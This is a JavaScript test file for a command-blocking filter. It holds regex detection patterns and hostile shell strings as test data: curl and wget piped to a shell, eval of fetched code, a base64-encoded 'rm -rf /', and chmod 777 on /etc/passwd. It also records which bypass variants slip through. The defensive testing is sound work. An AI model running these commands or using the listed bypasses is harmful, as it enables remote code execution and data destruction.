// c3-g2-bypass.test.js — C3 G2 gate patterns vs bypass variants

const G2_PATTERNS = [
  { pattern: /curl.*\|.*(ba)?sh/, label: "pipe_curl_shell" },
  { pattern: /base64\s+-d/, label: "base64_decode" },
  { pattern: /chmod\s+777/, label: "chmod_777" },
  { pattern: /eval\s+/, label: "eval" },
  { pattern: /wget.*\|/, label: "pipe_wget" },
];

function matchAny(s) {
  return G2_PATTERNS.some(p => p.pattern.test(s));
}

module.exports = {
  name: 'C3: G2 bypass variants',
  run: () => {
    const R = [];

    // curl | sh — G2 catches with spaces, no-space pipes, and /bin/sh paths
    R.push({n:'pipe-shell: curl | sh', p: matchAny('curl -s http://x.com | sh') === true});
    R.push({n:'pipe-shell: curl | bash', p: matchAny('curl -fsSL example.com/script | bash') === true});
    R.push({n:'pipe-shell: curl|sh (no space)', p: matchAny('curl -s http://x.com|sh') === true});
    R.push({n:'pipe-shell: curl|/bin/sh', p: matchAny('curl http://x.com|/bin/sh') === true});

    // base64 -d — catches short flag, --decode is a bypass (alt flag)
    R.push({n:'base64-decode: base64 -d', p: matchAny('echo L3JtIC1yZiAv | base64 -d') === true});
    R.push({n:'base64-decode: base64 -d pipe', p: matchAny('cat secret.txt | base64 -d') === true});
    R.push({n:'base64-alt-flag: --decode bypass', p: matchAny('base64 --decode secret') === false});

    // chmod 777 — pattern catches exact 777, bypasses like +rwsx pass through
    R.push({n:'chmod-777: chmod 777', p: matchAny('chmod 777 /etc/passwd') === true});
    R.push({n:'chmod-alt: +rwsx bypass', p: matchAny('chmod +rwsx file') === false});

    // eval — catches eval (space/command after)
    R.push({n:'eval: eval $(curl)', p: matchAny('eval "$(curl -s http://x.com)"') === true});
    R.push({n:'eval: eval base64', p: matchAny('eval $(base64 -d <<< "$ENC")') === true});

    // wget | — catches wget piped to shell
    R.push({n:'wget-pipe: wget | bash', p: matchAny('wget http://x.com/script.sh | bash') === true});
    R.push({n:'wget-pipe: wget -qO- | sh', p: matchAny('wget -qO- example.com/install | sh') === true});

    const ok = R.every(r => r.p);
    return {
      passed: ok,
      message: R.map(r => (r.p ? 'PASS' : 'FAIL') + ' ' + r.n).join('\n'),
      time_ms: 0,
    };
  },
};
if (require.main === module) { const r=module.exports.run(); console.log(r.passed?'PASS':'FAIL'); process.exit(r.passed?0:1); }
